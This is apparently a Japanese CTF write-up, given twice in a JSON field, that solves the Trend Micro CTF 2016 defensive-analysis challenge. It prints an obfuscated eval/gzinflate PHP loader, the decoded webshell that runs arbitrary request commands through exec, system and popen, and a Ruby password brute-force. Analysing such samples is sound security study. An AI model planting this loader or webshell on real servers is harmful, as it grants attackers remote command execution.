{"context": "\u4eca\u56de\u306eTrend Micro CTF 2016\u306e\u30aa\u30f3\u30e9\u30a4\u30f3\u4e88\u9078\u306f\u3042\u3093\u307e\u308a\u30ac\u30c3\u30c4\u30ea\u306f\u53c2\u52a0\u3067\u304d\u306a\u304b\u3063\u305f\u3051\u308c\u3069\u3001\u4ed6\u306e\u30c1\u30fc\u30e0\u30e1\u30a4\u30c8\u304c\u89e3\u3051\u3066\u3044\u306a\u304b\u3063\u305f\u554f\u984c\u3092\u4e00\u554f\u3060\u3051\u306f\u89e3\u304f\u3053\u3068\u304c\u3067\u304d\u305f\u3002\n\u89e3\u3051\u305f\u306e\u306f Analysis - defensive \u306e 100\u70b9\u554f\u984c\u3067\u3001\u4ee5\u4e0b\u3053\u306e\u554f\u984c\u3092\u89e3\u3044\u305f\u904e\u7a0b\u306b\u3064\u3044\u3066\u7c21\u5358\u306b\u30e1\u30e2\u3057\u3066\u304a\u304f\u3002\n\nAnalysis - defensive \u306e 100\u70b9\u554f\u984c\n<?php\n$GLOBALS['key'] = \"6c7f4d49729e58d7a458999b570e0151bc034ca7\"; \n$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$decodeme=$func('$x','ev'.'al'.'(\"?>\".gz'.'in'.'fla'.'te(ba'.'se'.'64'.'_de'.'co'.'de($x)));');$decodeme(\"7f1n\u301c(\u4e2d\u7565)\u301cvUP6/\");?>\n}\n\n\u3068\u3044\u3046\u611f\u3058\u306edecodeme_decodeme.php\u3068\u3044\u3046\u30d5\u30a1\u30a4\u30eb\u304c\u4e0e\u3048\u3089\u308c\u3066\u3044\u308b\u3002 \u30d5\u30a1\u30a4\u30eb\u540d\u304b\u3089\u3059\u308b\u3068\u3001\u3053\u308c\u3092\u4f55\u3068\u304b\u5fa9\u53f7\u5316\u3059\u308c\u3070\u826f\u3044\u3089\u3057\u3044\u3002\nPHP\u306f\u77e5\u3089\u306a\u3044\u3051\u308c\u3069\u3001\u3069\u3046\u3082\u30c9\u30c3\u30c8\u304c\u6587\u5b57\u5217\u9023\u7d50\u3063\u307d\u3044\u306e\u3067\u3001\u3061\u3087\u3063\u3068\u6574\u5f62\u3059\u308b\u3068\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u306a\u308b\u3002\n<?php\n$GLOBALS['key'] = \"6c7f4d49729e58d7a458999b570e0151bc034ca7\"; \n$func=\"create_function\";\n$decodeme=$func('$x','eval(\"?>\".gzinflate(base64_decode($x)));');\n$decodeme(\"7f1n\u301c(\u4e2d\u7565)\u301cvUP6/\");\n?>\n}\n\n\"create_function\"\u3068\u3044\u3046\u6587\u5b57\u5217\u3092\u305d\u306e\u307e\u307e\u95a2\u6570\u3068\u3057\u3066\u9069\u7528\u3067\u304d\u308b\u3068\u304b\u3001\u3055\u3059\u304cPHP\u3060\u306a\u3002\n\nbase64 \u3068 deflate \u306e\u5fa9\u53f7\n\u3067\u3001\u300c7f1n\u301c(\u4e2d\u7565)\u301cvUP6/\u300d\u306e\u90e8\u5206\u3092\u5fa9\u53f7\u3057\u3066\u307f\u3088\u3046\u3068\u3001\u3068\u308a\u3042\u3048\u305a\u30d5\u30a1\u30a4\u30eb(base64.txt)\u306b\u4fdd\u5b58\u3057\u3066\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u3057\u3066\u307f\u3066\u3082\u3001\u300cCodec.Compression.Zlib: compressed data stream format error (incorrect header check)\u300d\u3068\u3044\u3046\u30a8\u30e9\u30fc\u304c\u51fa\u3066\u3057\u307e\u3063\u305f\u3002GZip\u306e\u65b9\u3067\u3082\u540c\u3058\u7d50\u679c\u306b\u306a\u308b\u3002 Ruby\u306ezlib\u3092\u4f7f\u3063\u3066\u3082\u540c\u3058\u3002\nimport qualified Data.ByteString.Lazy.Char8 as BL\nimport qualified Data.ByteString.Base64.Lazy as Base64\nimport Data.Char\nimport qualified Codec.Compression.Zlib as Zlib\n-- import qualified Codec.Compression.GZip as GZip\n\nmain = do\n  s <- BL.readFile \"base64.txt\"\n  case Base64.decode (BL.filter (not . isSpace) s) of\n    Left err -> error err\n    Right s2 -> do\n      BL.writeFile \"encoded.dat\" s2\n      let s3 = Zlib.decompress s2\n      BL.writeFile \"decoded.dat\" s3\n\n\u8abf\u3079\u3066\u307f\u308b\u3068\u3001PHP\u306egzdeflate/gzinflate\u306f\u3001\u30d8\u30c3\u30c0\u3092\u4ed8\u3051\u306a\u3044\u3089\u3057\u3044\u3002 \u3067\u3001\u3069\u3046\u3057\u305f\u3082\u306e\u304b\u3068\u601d\u3063\u305f\u306e\u3060\u3051\u308c\u3069\u3001\u305f\u307e\u305f\u307e\u624b\u5143\u306e\u74b0\u5883\u306bPHP\u304c\u5165\u3063\u3066\u3044\u308b\u3088\u3046\u3060\u3063\u305f\u306e\u3067\u3001\u9069\u5f53\u306b\u3050\u3050\u3063\u305f\u7d50\u679c\u306b\u57fa\u3065\u3044\u3066\u3001\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u3057\u3066\u5b9f\u884c\u3057\u305f\u3002 \uff08\u306a\u304a\u3001\u5f8c\u3067\u8abf\u3079\u305f\u3068\u3053\u308d\u3001Haskell\u306ezlib\u30d1\u30c3\u30b1\u30fc\u30b8\u3067\u3082\u3001Codec.Compression.Zlib.Raw\u30e2\u30b8\u30e5\u30fc\u30eb\u3092\u4f7f\u3048\u3070\u826f\u304b\u3063\u305f\u3088\u3046\u3060)\n<?php\n$x=\"7f1n\u301c(\u4e2d\u7565)\u301cUP6/\";\necho gzinflate(base64_decode($x));\n?>\n\n\u3053\u3046\u3057\u3066\u5f97\u3089\u308c\u305f\u7d50\u679c\u306f\u4ee5\u4e0b\u306e\u3088\u3046\u306aPHP\u30d7\u30ed\u30b0\u30e9\u30e0\u3068\u306a\u3063\u3066\u3044\u305f\u3002\n<?php\n// reference: https://github.com/b374k/b374k/blob/master/LICENSE.md\nfunction chk_password(){\n    if(!isset($GLOBALS['key'])){ die(); }\n    if(trim($GLOBALS['key'])==''){ die(); }\n    $glob = $GLOBALS['key'];\n\n    $post = '';\n    $cook = '';\n    if (isset($_POST['key'])) { $post = $_POST['key']; }\n    if (isset($_COOKIE['key'])) { $cook = $_COOKIE['key']; }\n    if ($cook==$glob) { return; }\n\n    if($post != ''){\n        $key = sha1(md5($post));\n        if($key==$glob){\n            setcookie(\"key\", $key, time()+36000, \"/\");\n            $qstr = (isset($_SERVER[\"QUERY_STRING\"])&&(!empty($_SERVER[\"QUERY_STRING\"])))?\"?\".$_SERVER[\"QUERY_STRING\"]:\"\";\n            header(\"Location: \".htmlspecialchars($_SERVER[\"REQUEST_URI\"].$qstr, 2 | 1));\n            $cook = $_COOKIE['key'];\n        }\n    }\n\n    $output = \"\n    <html><head><meta http-equiv='Content-Type' content='text/html; charset=utf-8'><meta http-equiv='Content-Language' content='en-us'>\n    <title>decodeme</title>\n    <style type='text/css'>\n    <!--\n    body{ background-color:darkred; color:white; }\n    hr{ background-color:dimgray; color:dimgray; border:0 none; height: 2px; }\n    -->\n    </style>\n    </head>\n    <body>\n    <br><br>\n    <form method='post'>\n    <center>\n    <input type='password' id='key' name='key'>\n    <p>enter ****</p>\n    </center>\n    </form>\n    </body></html>\";\n\n    echo $output;\n    die();\n\n}\nchk_password();\n?>\n\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"><meta http-equiv=\"Content-Language\" content=\"en-us\">\n<title>decodeme</title>\n<style type=\"text/css\">\n<!--\nbody{ background-color:darkred; color:white; }\nhr{ background-color:dimgray; color:dimgray; border:0 none; height: 2px; }\n-->\n</style>\n</head>\n\n<?php\n$GLOBALS['images']['version']= \"iVBO\u301c(\u4e2d\u7565)\u301cYII=\";\n$GLOBALS['images']['top']= \"iVBO\u301c(\u4e2d\u7565)\u301cgg==\";\n$GLOBALS['images']['contact']= \"iVBO\u301c(\u4e2d\u7565)\u301cYII=\";\n$GLOBALS['images']['author']= \"iVBO\u301c(\u4e2d\u7565)\u301cgg==\";\n$GLOBALS['images']['license']= \"iVBO\u301c(\u4e2d\u7565)\u301cQmCC\";\n$GLOBALS['images']['support']= \"iVBO\u301c(\u4e2d\u7565)\u301cQmCC\";\n$GLOBALS['images']['lock']= \"iVBO\u301c(\u4e2d\u7565)\u301cgg==\";\n\n?>\n\n<body>\n<img src=\"data:image/png;base64,<?php echo $GLOBALS['images']['top']; ?>\" alt=\"top\" />\n<p>7h15 15 51mpl3 w3b5h3ll. 1npu7 y0ur cmd h3r3.</p>\n<hr>\n\n<?php\nfunction myshellexec($cmd)\n{ \n $result = \"\";\n if (!empty($cmd))\n {\n  if (is_callable(\"exec\")) {exec($cmd,$result); $result = join(\"\\n\",$result);}\n  elseif (is_callable(\"shell_exec\")) {$result = shell_exec($cmd);}\n  elseif (is_callable(\"system\")) {@ob_start(); system($cmd); $result = @ob_get_contents(); @ob_end_clean();}\n  elseif (is_callable(\"passthru\")) {@ob_start(); passthru($cmd); $result = @ob_get_contents(); @ob_end_clean();}\n  elseif (($result = `$cmd`) !== false) {}\n  elseif (is_resource($fp = popen($cmd,\"r\")))\n  {\n   $result = \"\";\n   while(!feof($fp)) {$result .= fread($fp,1024);}\n   pclose($fp);\n  }\n }\n return $result;\n}\n\nfunction _3x3c_637v3r510n($cmd){\n $result = \"\";\n if (!empty($cmd))\n {\n    if ($cmd == \"getversion\"){\n    ?>\n    <img align=\"left\" src=\"data:image/png;base64,<?php echo $GLOBALS['images']['version']; ?>\" alt=\"figure\" />\n    <br>\n    <?php\n    $result = \"TMCTF webshell v1.0 beta betta\";\n    }  \n }\n return $result;\n}\n\nfunction _3x3c_wh04u7h0r($cmd){\n $result = \"\";\n if (!empty($cmd))\n {\n    if ($cmd == \"whoauthor\"){\n    ?>\n    <img align=\"left\" src=\"data:image/png;base64,<?php echo $GLOBALS['images']['author']; ?>\" alt=\"figure\" />\n    <br>\n    <?php\n    $result = \"web shell cooker\";\n    }  \n }\n return $result;\n}\n\nfunction _3x3c_buyl1c3n53($cmd){\n $result = \"\";\n if (!empty($cmd))\n {\n    if ($cmd == \"buylicense\"){\n    ?>\n    <img align=\"left\" src=\"data:image/png;base64,<?php echo $GLOBALS['images']['license']; ?>\" alt=\"figure\" />\n    <br>\n    <?php\n    $result = \"paid $100000000000000000000000000 :-)\";\n    }  \n }\n return $result;\n}\n\nfunction _3x3c_5h0wl0ck($cmd){\n $result = \"\";\n if (!empty($cmd))\n {\n    if ($cmd == \"showlock\"){\n    ?>\n    <img align=\"left\" src=\"data:image/png;base64,<?php echo $GLOBALS['images']['lock']; ?>\" alt=\"figure\" />\n    <br>\n    <?php\n    $result = \"show lock\";\n    }  \n }\n return $result;\n}\n\n\nfunction _3x3c_5h0w5upp0r7($cmd){\n $result = \"\";\n if (!empty($cmd))\n {\n    if ($cmd == \"showsupport\"){\n    ?>\n    <img align=\"left\" src=\"data:image/png;base64,<?php echo $GLOBALS['images']['support']; ?>\" alt=\"figure\" />\n    <br>\n    <?php\n    $result = \"call +99-99999-9999-999-99-99-9-99-9-999--99-99--9-9\";\n    }  \n }\n return $result;\n}\n\nfunction _3x3c_5h0wc0n74c7($cmd){\n $result = \"\";\n if (!empty($cmd))\n {\n    if ($cmd == \"showcontact\"){\n    ?>\n    <img align=\"left\" src=\"data:image/png;base64,<?php echo $GLOBALS['images']['contact']; ?>\" alt=\"figure\" />\n    <br>\n    <?php\n    $result = \"contact xxxxxxxxxyyyyyyyyzzzzzzz@trendmicro\";\n    }  \n }\n return $result;\n}\n\nif(isset($_REQUEST['cmd'])){\n        echo \"<pre>\";\n        $cmd = ($_REQUEST['cmd']);\n        echo myshellexec($cmd);\n        echo _3x3c_637v3r510n($cmd);\n        echo _3x3c_wh04u7h0r($cmd);\n        echo _3x3c_buyl1c3n53($cmd);\n        echo _3x3c_5h0wl0ck($cmd);\n        echo _3x3c_5h0w5upp0r7($cmd);\n        echo _3x3c_5h0wc0n74c7($cmd);\n        echo \"</pre>\";\n}\n?>\n</body>\n</html>\n\nkey\u30d1\u30e9\u30e1\u30fc\u30bf\u3092md5\u3068sha1\u306e\u4e8c\u6bb5\u968e\u3067\u30cf\u30c3\u30b7\u30e5\u3057\u305f\u7d50\u679c\u3092 $GLOBALS['key']\u306e\u5024 \"6c7f4d49729e58d7a458999b570e0151bc034ca7\" \u3068\u6bd4\u8f03\u3057\u3066\u8a8d\u8a3c\u3057\u3066\u3044\u308b\u3002\n\u5185\u5bb9\u306f\u30a6\u30a7\u30d6\u30b7\u30a7\u30eb\u3063\u307d\u3044\u3051\u308c\u3069\u3082\u3001\u5404\u30b3\u30de\u30f3\u30c9\u306e\u5b9f\u884c\u7d50\u679c\u3084\u3001\u30b3\u30fc\u30c9\u3092\u4e00\u901a\u308a\u8aad\u3093\u3067\u3082\u3001\u30d5\u30e9\u30b0\u3063\u307d\u3044\u3082\u306e\u306f\u898b\u3064\u304b\u3089\u305a\u3001\u3060\u3044\u3076\u60a9\u3093\u3067\u3057\u307e\u3063\u305f\u3002\n\n\u30d1\u30b9\u30ef\u30fc\u30c9\u306e\u63a2\u7d22\n\u3075\u3068\u3001\u3072\u3087\u3063\u3068\u3057\u3066\u3001\u3053\u306e\u30a6\u30a7\u30d6\u30b7\u30a7\u30eb\u306e\u30d1\u30b9\u30ef\u30fc\u30c9\u304c\u30d5\u30e9\u30b0\u306a\u306e\u3067\u306f\u3068\u601d\u3044\u3064\u3044\u305f\u3002 \u3057\u304b\u3082\u300center ****\u300d\u3068\u3042\u308b\u306e\u3067\u3001\u3082\u30574\u6841\u306a\u3089\u63a2\u305b\u305d\u3046\u3068\u8003\u3048\u3001\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u8a66\u3057\u305f\u3089\u3001\u300ch4ck\u300d\u304c\u6c42\u307e\u3063\u305f\u3002 \u305f\u3060\u3001\u300cTMCTF{h4ck}\u300d\u3092\u30b5\u30d6\u30df\u30c3\u30c8\u3057\u3066\u3082\u4e0d\u6b63\u89e3\u3002\nrequire 'digest/md5'\nrequire 'digest/sha1'\n\ncs = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\".split(//)\n\ncs.each{|c1|\n  cs.each{|c2|\n    cs.each{|c3|\n      cs.each{|c4|\n        s = c1 + c2 + c3 + c4\n        s2 = Digest::SHA1.hexdigest(Digest::MD5.hexdigest(s))\n        if s2 == \"6c7f4d49729e58d7a458999b570e0151bc034ca7\"\n          puts s #=> h4ck\n          puts s2\n        end\n      }\n    }\n  }\n}\n\n\n\u753b\u50cf\u306b\u57cb\u3081\u8fbc\u307e\u308c\u305f\u30d2\u30f3\u30c8\n\u3072\u3087\u3063\u3068\u3057\u3066\u30bd\u30fc\u30b9\u30b3\u30fc\u30c9\u3067\u306a\u3051\u308c\u3070\u753b\u50cf\u306b\u4f55\u304b\u57cb\u3081\u8fbc\u307e\u308c\u3066\u3044\u308b\u306e\u3067\u306f\u3068\u601d\u3063\u3066\u3001$GLOBALS['images'] \u4ee5\u4e0b\u306e\u753b\u50cf\u30c7\u30fc\u30bf\u3092\u5fa9\u53f7\u3057\u3066\u30d5\u30a1\u30a4\u30eb\u306b\u4fdd\u5b58\u3057\u3066strings\u3067\u898b\u3066\u307f\u308b\u3068\u3001lock\u306e\u753b\u50cf\u306b\u3060\u3051\u3001\u300czTXt\u300d\u3084\u300cRaw profile type exif\u300d\u3068\u3044\u3046\u6587\u5b57\u5217\u304c\u542b\u307e\u308c\u3066\u3044\u308b\u306e\u3092\u767a\u898b\u3002\nPNG\u306e\u30c1\u30e3\u30f3\u30af\u69cb\u9020\u3092\u4e00\u77ac\u8abf\u3079\u304b\u3051\u305f\u3051\u3069\u3001\u300cexif\u300d\u3068\u3042\u308b\u3057\u3001\u300c\u3082\u3057exiftool\u3067\u8868\u793a\u3067\u304d\u308b\u306a\u3089\u3001\u305d\u308c\u304c\u65e9\u3044\u304b\u300d\u3068\u601d\u3063\u3066\u8a66\u3057\u3066\u307f\u305f\u3089\u3001\u8868\u793a\u3067\u304d\u305f\u3002\n$ exiftool lock.png \nexiftool lock.png \nExifTool Version Number         : 10.15\nFile Name                       : lock.png\nDirectory                       : .\nFile Size                       : 2.3 kB\nFile Modification Date/Time     : 2016:07:30 22:38:39+09:00\nFile Access Date/Time           : 2016:07:31 12:37:45+09:00\nFile Inode Change Date/Time     : 2016:07:30 22:45:15+09:00\nFile Permissions                : rw-r--r--\nFile Type                       : PNG\nFile Type Extension             : png\nMIME Type                       : image/png\nImage Width                     : 71\nImage Height                    : 114\nBit Depth                       : 8\nColor Type                      : Palette\nCompression                     : Deflate/Inflate\nFilter                          : Adaptive\nInterlace                       : Adam7 Interlace\nExif Byte Order                 : Little-endian (Intel, II)\nMake                            : /.*/e\nCamera Model Name               : eval(base64_decode(\"ZWNobyAnZmxhZyBpcyBzaGExKHBhc3N3b3JkKSc7\"));\nSRGB Rendering                  : Perceptual\nGamma                           : 2.2\nPalette                         : (Binary data 585 bytes, use -b option to extract)\nTransparency                    : (Binary data 195 bytes, use -b option to extract)\nPixels Per Unit X               : 5905\nPixels Per Unit Y               : 5905\nPixel Units                     : meters\nImage Size                      : 71x114\nMegapixels                      : 0.008\n\nCamera Model Name \u306b\u602a\u3057\u3044\u6587\u5b57\u5217\u300ceval(base64_decode(\"ZWNobyAnZmxhZyBpcyBzaGExKHBhc3N3b3JkKSc7\"));\u300d\u304c\u3002\u3068\u3044\u3046\u3053\u3068\u3067\u5fa9\u53f7\u3057\u3066\u307f\u308b\u3068\u3001\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u30d2\u30f3\u30c8\u304c\u5f97\u3089\u308c\u308b\u3002\nirb(main):002:0> Base64.decode64(\"ZWNobyAnZmxhZyBpcyBzaGExKHBhc3N3b3JkKSc7\")\nBase64.decode64(\"ZWNobyAnZmxhZyBpcyBzaGExKHBhc3N3b3JkKSc7\")\n=> \"echo 'flag is sha1(password)';\"\n\n\u3068\u3044\u3046\u308f\u3051\u3067\u3001\u5148\u307b\u3069\u306e\u30d1\u30b9\u30ef\u30fc\u30c9\u306e\u30cf\u30c3\u30b7\u30e5\u5024\u3092\u8a08\u7b97\u3057\u3066\u307f\u308b\u3068\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u306a\u308a\u3001\u300cTMCTF{e17e98788d6b4ac922b2df100ef9398ae0f229ad}\u300d\u3092\u30b5\u30d6\u30df\u30c3\u30c8\u3057\u305f\u3089\u6b63\u89e3\u306b\u306a\u3063\u305f\u3002\nirb(main):005:0> Digest::SHA1.hexdigest(\"h4ck\")\nDigest::SHA1.hexdigest(\"h4ck\")\n=> \"e17e98788d6b4ac922b2df100ef9398ae0f229ad\"\n\n\u4eca\u56de\u306e[Trend Micro CTF 2016](http://www.trendmicro.co.jp/jp/sp/ctf2016_jp/)\u306e\u30aa\u30f3\u30e9\u30a4\u30f3\u4e88\u9078\u306f\u3042\u3093\u307e\u308a\u30ac\u30c3\u30c4\u30ea\u306f\u53c2\u52a0\u3067\u304d\u306a\u304b\u3063\u305f\u3051\u308c\u3069\u3001\u4ed6\u306e\u30c1\u30fc\u30e0\u30e1\u30a4\u30c8\u304c\u89e3\u3051\u3066\u3044\u306a\u304b\u3063\u305f\u554f\u984c\u3092\u4e00\u554f\u3060\u3051\u306f\u89e3\u304f\u3053\u3068\u304c\u3067\u304d\u305f\u3002\n\n\u89e3\u3051\u305f\u306e\u306f Analysis - defensive \u306e 100\u70b9\u554f\u984c\u3067\u3001\u4ee5\u4e0b\u3053\u306e\u554f\u984c\u3092\u89e3\u3044\u305f\u904e\u7a0b\u306b\u3064\u3044\u3066\u7c21\u5358\u306b\u30e1\u30e2\u3057\u3066\u304a\u304f\u3002\n\n## Analysis - defensive \u306e 100\u70b9\u554f\u984c\n\n```php\n<?php\n$GLOBALS['key'] = \"6c7f4d49729e58d7a458999b570e0151bc034ca7\"; \n$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$decodeme=$func('$x','ev'.'al'.'(\"?>\".gz'.'in'.'fla'.'te(ba'.'se'.'64'.'_de'.'co'.'de($x)));');$decodeme(\"7f1n\u301c(\u4e2d\u7565)\u301cvUP6/\");?>\n}\n```\n\n\u3068\u3044\u3046\u611f\u3058\u306edecodeme_decodeme.php\u3068\u3044\u3046\u30d5\u30a1\u30a4\u30eb\u304c\u4e0e\u3048\u3089\u308c\u3066\u3044\u308b\u3002 \u30d5\u30a1\u30a4\u30eb\u540d\u304b\u3089\u3059\u308b\u3068\u3001\u3053\u308c\u3092\u4f55\u3068\u304b\u5fa9\u53f7\u5316\u3059\u308c\u3070\u826f\u3044\u3089\u3057\u3044\u3002\n\nPHP\u306f\u77e5\u3089\u306a\u3044\u3051\u308c\u3069\u3001\u3069\u3046\u3082\u30c9\u30c3\u30c8\u304c\u6587\u5b57\u5217\u9023\u7d50\u3063\u307d\u3044\u306e\u3067\u3001\u3061\u3087\u3063\u3068\u6574\u5f62\u3059\u308b\u3068\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u306a\u308b\u3002\n\n```php\n<?php\n$GLOBALS['key'] = \"6c7f4d49729e58d7a458999b570e0151bc034ca7\"; \n$func=\"create_function\";\n$decodeme=$func('$x','eval(\"?>\".gzinflate(base64_decode($x)));');\n$decodeme(\"7f1n\u301c(\u4e2d\u7565)\u301cvUP6/\");\n?>\n}\n```\n\n`\"create_function\"`\u3068\u3044\u3046\u6587\u5b57\u5217\u3092\u305d\u306e\u307e\u307e\u95a2\u6570\u3068\u3057\u3066\u9069\u7528\u3067\u304d\u308b\u3068\u304b\u3001\u3055\u3059\u304cPHP\u3060\u306a\u3002\n\n## base64 \u3068 deflate \u306e\u5fa9\u53f7\n\n\u3067\u3001\u300c7f1n\u301c(\u4e2d\u7565)\u301cvUP6/\u300d\u306e\u90e8\u5206\u3092\u5fa9\u53f7\u3057\u3066\u307f\u3088\u3046\u3068\u3001\u3068\u308a\u3042\u3048\u305a\u30d5\u30a1\u30a4\u30eb(base64.txt)\u306b\u4fdd\u5b58\u3057\u3066\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u3057\u3066\u307f\u3066\u3082\u3001\u300cCodec.Compression.Zlib: compressed data stream format error (incorrect header check)\u300d\u3068\u3044\u3046\u30a8\u30e9\u30fc\u304c\u51fa\u3066\u3057\u307e\u3063\u305f\u3002GZip\u306e\u65b9\u3067\u3082\u540c\u3058\u7d50\u679c\u306b\u306a\u308b\u3002 Ruby\u306ezlib\u3092\u4f7f\u3063\u3066\u3082\u540c\u3058\u3002\n\n```haskell\nimport qualified Data.ByteString.Lazy.Char8 as BL\nimport qualified Data.ByteString.Base64.Lazy as Base64\nimport Data.Char\nimport qualified Codec.Compression.Zlib as Zlib\n-- import qualified Codec.Compression.GZip as GZip\n\nmain = do\n  s <- BL.readFile \"base64.txt\"\n  case Base64.decode (BL.filter (not . isSpace) s) of\n    Left err -> error err\n    Right s2 -> do\n      BL.writeFile \"encoded.dat\" s2\n      let s3 = Zlib.decompress s2\n      BL.writeFile \"decoded.dat\" s3\n```\n\n\u8abf\u3079\u3066\u307f\u308b\u3068\u3001PHP\u306e`gzdeflate`/`gzinflate`\u306f\u3001\u30d8\u30c3\u30c0\u3092\u4ed8\u3051\u306a\u3044\u3089\u3057\u3044\u3002 \u3067\u3001\u3069\u3046\u3057\u305f\u3082\u306e\u304b\u3068\u601d\u3063\u305f\u306e\u3060\u3051\u308c\u3069\u3001\u305f\u307e\u305f\u307e\u624b\u5143\u306e\u74b0\u5883\u306bPHP\u304c\u5165\u3063\u3066\u3044\u308b\u3088\u3046\u3060\u3063\u305f\u306e\u3067\u3001\u9069\u5f53\u306b\u3050\u3050\u3063\u305f\u7d50\u679c\u306b\u57fa\u3065\u3044\u3066\u3001\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u3057\u3066\u5b9f\u884c\u3057\u305f\u3002 \uff08\u306a\u304a\u3001\u5f8c\u3067\u8abf\u3079\u305f\u3068\u3053\u308d\u3001Haskell\u306ezlib\u30d1\u30c3\u30b1\u30fc\u30b8\u3067\u3082\u3001`Codec.Compression.Zlib.Raw`\u30e2\u30b8\u30e5\u30fc\u30eb\u3092\u4f7f\u3048\u3070\u826f\u304b\u3063\u305f\u3088\u3046\u3060)\n\n```php\n<?php\n$x=\"7f1n\u301c(\u4e2d\u7565)\u301cUP6/\";\necho gzinflate(base64_decode($x));\n?>\n```\n\n\u3053\u3046\u3057\u3066\u5f97\u3089\u308c\u305f\u7d50\u679c\u306f\u4ee5\u4e0b\u306e\u3088\u3046\u306aPHP\u30d7\u30ed\u30b0\u30e9\u30e0\u3068\u306a\u3063\u3066\u3044\u305f\u3002\n\n```php\n<?php\n// reference: https://github.com/b374k/b374k/blob/master/LICENSE.md\nfunction chk_password(){\n    if(!isset($GLOBALS['key'])){ die(); }\n    if(trim($GLOBALS['key'])==''){ die(); }\n    $glob = $GLOBALS['key'];\n\n    $post = '';\n    $cook = '';\n    if (isset($_POST['key'])) { $post = $_POST['key']; }\n    if (isset($_COOKIE['key'])) { $cook = $_COOKIE['key']; }\n    if ($cook==$glob) { return; }\n\n    if($post != ''){\n\t    $key = sha1(md5($post));\n        if($key==$glob){\n\t\t    setcookie(\"key\", $key, time()+36000, \"/\");\n            $qstr = (isset($_SERVER[\"QUERY_STRING\"])&&(!empty($_SERVER[\"QUERY_STRING\"])))?\"?\".$_SERVER[\"QUERY_STRING\"]:\"\";\n\t\t    header(\"Location: \".htmlspecialchars($_SERVER[\"REQUEST_URI\"].$qstr, 2 | 1));\n        \t$cook = $_COOKIE['key'];\n\t    }\n    }\n\n    $output = \"\n    <html><head><meta http-equiv='Content-Type' content='text/html; charset=utf-8'><meta http-equiv='Content-Language' content='en-us'>\n    <title>decodeme</title>\n    <style type='text/css'>\n    <!--\n    body{ background-color:darkred; color:white; }\n    hr{ background-color:dimgray; color:dimgray; border:0 none; height: 2px; }\n    -->\n    </style>\n    </head>\n    <body>\n    <br><br>\n    <form method='post'>\n    <center>\n    <input type='password' id='key' name='key'>\n    <p>enter ****</p>\n    </center>\n    </form>\n    </body></html>\";\n\n\techo $output;\n\tdie();\n\n}\nchk_password();\n?>\n\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"><meta http-equiv=\"Content-Language\" content=\"en-us\">\n<title>decodeme</title>\n<style type=\"text/css\">\n<!--\nbody{ background-color:darkred; color:white; }\nhr{ background-color:dimgray; color:dimgray; border:0 none; height: 2px; }\n-->\n</style>\n</head>\n\n<?php\n$GLOBALS['images']['version']= \"iVBO\u301c(\u4e2d\u7565)\u301cYII=\";\n$GLOBALS['images']['top']= \"iVBO\u301c(\u4e2d\u7565)\u301cgg==\";\n$GLOBALS['images']['contact']= \"iVBO\u301c(\u4e2d\u7565)\u301cYII=\";\n$GLOBALS['images']['author']= \"iVBO\u301c(\u4e2d\u7565)\u301cgg==\";\n$GLOBALS['images']['license']= \"iVBO\u301c(\u4e2d\u7565)\u301cQmCC\";\n$GLOBALS['images']['support']= \"iVBO\u301c(\u4e2d\u7565)\u301cQmCC\";\n$GLOBALS['images']['lock']= \"iVBO\u301c(\u4e2d\u7565)\u301cgg==\";\n\n?>\n\n<body>\n<img src=\"data:image/png;base64,<?php echo $GLOBALS['images']['top']; ?>\" alt=\"top\" />\n<p>7h15 15 51mpl3 w3b5h3ll. 1npu7 y0ur cmd h3r3.</p>\n<hr>\n\n<?php\nfunction myshellexec($cmd)\n{ \n $result = \"\";\n if (!empty($cmd))\n {\n  if (is_callable(\"exec\")) {exec($cmd,$result); $result = join(\"\\n\",$result);}\n  elseif (is_callable(\"shell_exec\")) {$result = shell_exec($cmd);}\n  elseif (is_callable(\"system\")) {@ob_start(); system($cmd); $result = @ob_get_contents(); @ob_end_clean();}\n  elseif (is_callable(\"passthru\")) {@ob_start(); passthru($cmd); $result = @ob_get_contents(); @ob_end_clean();}\n  elseif (($result = `$cmd`) !== false) {}\n  elseif (is_resource($fp = popen($cmd,\"r\")))\n  {\n   $result = \"\";\n   while(!feof($fp)) {$result .= fread($fp,1024);}\n   pclose($fp);\n  }\n }\n return $result;\n}\n\nfunction _3x3c_637v3r510n($cmd){\n $result = \"\";\n if (!empty($cmd))\n {\n    if ($cmd == \"getversion\"){\n    ?>\n    <img align=\"left\" src=\"data:image/png;base64,<?php echo $GLOBALS['images']['version']; ?>\" alt=\"figure\" />\n    <br>\n    <?php\n    $result = \"TMCTF webshell v1.0 beta betta\";\n    }  \n }\n return $result;\n}\n\nfunction _3x3c_wh04u7h0r($cmd){\n $result = \"\";\n if (!empty($cmd))\n {\n    if ($cmd == \"whoauthor\"){\n    ?>\n    <img align=\"left\" src=\"data:image/png;base64,<?php echo $GLOBALS['images']['author']; ?>\" alt=\"figure\" />\n    <br>\n    <?php\n    $result = \"web shell cooker\";\n    }  \n }\n return $result;\n}\n\nfunction _3x3c_buyl1c3n53($cmd){\n $result = \"\";\n if (!empty($cmd))\n {\n    if ($cmd == \"buylicense\"){\n    ?>\n    <img align=\"left\" src=\"data:image/png;base64,<?php echo $GLOBALS['images']['license']; ?>\" alt=\"figure\" />\n    <br>\n    <?php\n    $result = \"paid $100000000000000000000000000 :-)\";\n    }  \n }\n return $result;\n}\n\nfunction _3x3c_5h0wl0ck($cmd){\n $result = \"\";\n if (!empty($cmd))\n {\n    if ($cmd == \"showlock\"){\n    ?>\n    <img align=\"left\" src=\"data:image/png;base64,<?php echo $GLOBALS['images']['lock']; ?>\" alt=\"figure\" />\n    <br>\n    <?php\n    $result = \"show lock\";\n    }  \n }\n return $result;\n}\n\n\nfunction _3x3c_5h0w5upp0r7($cmd){\n $result = \"\";\n if (!empty($cmd))\n {\n    if ($cmd == \"showsupport\"){\n    